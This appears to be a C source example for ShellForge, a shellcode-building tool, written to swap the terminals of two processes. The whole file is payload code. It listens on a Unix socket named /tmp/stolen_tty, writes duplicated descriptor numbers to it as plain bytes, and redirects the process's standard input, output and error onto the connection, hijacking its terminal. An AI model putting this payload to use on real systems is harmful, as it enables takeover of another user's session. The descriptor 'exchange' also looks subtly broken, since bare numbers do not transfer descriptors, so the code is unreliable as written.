/* 
 * ShellForge example: exchange the TTY of two processes
 * $Id$
 */

int main(void)
{
	int s,t;
	struct sockaddr_un sa,from;
	int fromlen;
	char buf[4];
	char path[] = "/tmp/stolen_tty";


	sa.sun_family = AF_UNIX;
	
	for (s = 0; s < sizeof(path);  s++)
	          sa.sun_path[s] = path[s];

	s = socket(PF_UNIX, SOCK_STREAM, 0);
	unlink(path);
	bind(s, (struct sockaddr *)&sa, sizeof(sa));
	listen(s, 1);
	t = -1;
	while (t < 0) {
	    	fromlen = sizeof(from);
		t = accept(s, (struct sockaddr *)&from, &fromlen);
	}
	unlink(path);
	close(s);
	buf[0] = dup(0);
	buf[1] = dup(1);
	buf[2] = dup(2);
	buf[3] = 0;
	
	send(t, buf, 4, 0);

	dup2(t, 0);
	dup2(t, 1);
	dup2(t, 2);
	
//	close(t);
}
